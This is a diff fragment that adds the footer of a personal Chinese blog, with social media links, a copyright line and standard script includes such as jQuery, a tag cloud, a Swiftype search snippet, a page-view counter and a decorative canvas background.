+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/rao-song-63?utm_source=qq&amp;utm_medium=social">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/3870422953?refer_flag=1001030001_&amp;nick=RS丶从徒手开碧根果开始">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank" href="https://github.com/rliyuqing">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 折戟 2019
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                     Theme by Haojen Ma
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rliyuqing.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-4c7992ea7ad8aea9.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+<script type="text/javascript"
+color="0,0,0" opacity='0.4' zIndex="-2" count="66" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+	
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+</html>
